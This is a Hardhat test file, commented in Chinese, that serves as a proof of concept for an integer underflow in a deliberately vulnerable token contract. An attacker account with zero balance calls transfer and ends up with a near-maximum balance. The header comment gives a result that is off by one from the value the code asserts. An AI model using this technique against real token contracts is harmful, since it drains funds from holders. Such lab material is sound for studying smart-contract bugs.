/**
 * 整数溢出 POC (Proof of Concept)
 * 运行环境：Hardhat / Node.js + ethers.js
 *
 * 复现步骤：
 *   1. 部署 VulnerableToken，初始 1000 VT 给部署者
 *   2. 攻击者余额为 0，调用 transfer 转账任意数量
 *   3. 由于 unchecked 下溢，攻击者余额变为 2^256 - 1 - amount
 */

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Integer Overflow POC", function () {
  let token, owner, attacker;

  before(async function () {
    [owner, attacker] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("VulnerableToken");
    token = await Token.deploy();
    await token.deployed();
  });

  it("攻击者初始余额为 0", async function () {
    expect(await token.balanceOf(attacker.address)).to.equal(0);
  });

  it("攻击者通过下溢获得巨额代币", async function () {
    const amount = ethers.utils.parseEther("1");

    // 攻击者余额为 0 却尝试转账 1 VT，触发下溢
    await token.connect(attacker).transfer(owner.address, amount);

    const attackerBalance = await token.balanceOf(attacker.address);
    console.log("攻击后攻击者余额:", attackerBalance.toString());

    // 余额变为 type(uint256).max - amount + 1（下溢结果）
    const expected = ethers.constants.MaxUint256.sub(amount).add(1);
    expect(attackerBalance).to.equal(expected);
  });
});
